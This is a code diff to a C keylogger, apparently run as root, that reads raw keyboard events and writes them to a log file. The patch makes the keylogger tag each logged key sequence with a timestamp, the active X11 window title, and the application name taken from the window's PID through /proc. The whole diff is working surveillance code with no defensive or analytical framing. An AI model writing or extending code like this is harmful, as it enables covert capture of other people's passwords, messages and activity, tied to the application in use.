@@ -13,6 +13,7 @@
 #include "options.h"
 #include "config.h"
 #include <X11/Xlib.h>
+#include <X11/Xatom.h>
 
 #define KEY_RELEASE 0
 #define KEY_PRESS 1
@@ -32,49 +33,77 @@ static void rootCheck() {
    }
 }
 
-static void displaycheck(char *out, size_t outlen)
+
+static void displaycheck(char *win_title, size_t title_len,
+                         char *app_name,  size_t app_len)
 {
-    if (!out || outlen == 0) return;
-    out[0] = '\0';
+    if (win_title && title_len) win_title[0] = '\0';
+    if (app_name && app_len)   app_name[0] = '\0';
 
     Display *display = XOpenDisplay(NULL);
     if (!display) {
-        snprintf(out, outlen, "NO_DISPLAY");
+        snprintf(win_title, title_len, "NO_DISPLAY");
+        snprintf(app_name, app_len, "NO_DISPLAY");
         return;
     }
 
     Window root = DefaultRootWindow(display);
     Atom activeAtom = XInternAtom(display, "_NET_ACTIVE_WINDOW", True);
-    if (activeAtom == None) {
-        snprintf(out, outlen, "NO_ACTIVE_WINDOW");
-        XCloseDisplay(display);
-        return;
-    }
+    Atom pidAtom    = XInternAtom(display, "_NET_WM_PID", True);
 
     Atom type;
     int format;
     unsigned long nitems, bytes_after;
     unsigned char *data = NULL;
 
+    /* ---- active window ---- */
     if (XGetWindowProperty(display, root, activeAtom,
                            0, (~0L), False, AnyPropertyType,
                            &type, &format, &nitems,
                            &bytes_after, &data) != Success || !data) {
-        snprintf(out, outlen, "UNKNOWN_WINDOW");
         XCloseDisplay(display);
         return;
     }
 
-    Window activeWindow = *(Window *)data;
+    Window win = *(Window *)data;
     XFree(data);
 
-    char *windowName = NULL;
-    if (XFetchName(display, activeWindow, &windowName) > 0 && windowName) {
-        strncpy(out, windowName, outlen - 1);
-        out[outlen - 1] = '\0';
-        XFree(windowName);
+    /* ---- window title ---- */
+    char *name = NULL;
+    if (XFetchName(display, win, &name) > 0 && name) {
+        strncpy(win_title, name, title_len - 1);
+        win_title[title_len - 1] = '\0';
+        XFree(name);
     } else {
-        snprintf(out, outlen, "UNTITLED_WINDOW");
+        snprintf(win_title, title_len, "UNTITLED");
+    }
+
+    /* ---- window PID ---- */
+    pid_t pid = -1;
+    if (pidAtom != None &&
+        XGetWindowProperty(display, win, pidAtom,
+                           0, 1, False, XA_CARDINAL,
+                           &type, &format, &nitems,
+                           &bytes_after, &data) == Success && data) {
+        pid = *(pid_t *)data;
+        XFree(data);
+    }
+
+    /* ---- application name via /proc ---- */
+    if (pid > 0) {
+        char path[64];
+        snprintf(path, sizeof(path), "/proc/%d/comm", pid);
+
+        FILE *f = fopen(path, "r");
+        if (f) {
+            fgets(app_name, app_len, f);
+            fclose(f);
+            app_name[strcspn(app_name, "\n")] = '\0';
+        } else {
+            snprintf(app_name, app_len, "PID_%d", pid);
+        }
+    } else {
+        snprintf(app_name, app_len, "UNKNOWN_APP");
     }
 
     XCloseDisplay(display);
@@ -145,9 +174,9 @@ while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
                     fputs("\r\n\n", logfile);
 
                     char ts[64];
-                    char window[256];
+                    char title[256];
+                    char app[64];
                     time_t now = time(NULL);
-
 		    struct tm *lt = localtime(&now);
 
                     /*
@@ -172,8 +201,8 @@ while (read(kbd_fd, &event, sizeof(input_event)) > 0) {
 
                     /* ACTIVE FORMAT — CHANGE THIS ONE LINE */
                     // strftime(ts, sizeof(ts), "%Y-%m-%d %H:%M:%S", lt);
-                    displaycheck(window, sizeof(window));
-                    fprintf(logfile, "[%s] [%s] ", ts, window);
+                    displaycheck(title, sizeof(title), app, sizeof(app));
+                    fprintf(logfile, "[%s - %s - %s] ", ts, app, title);
                     fputs(name, logfile);
 
                 } else {
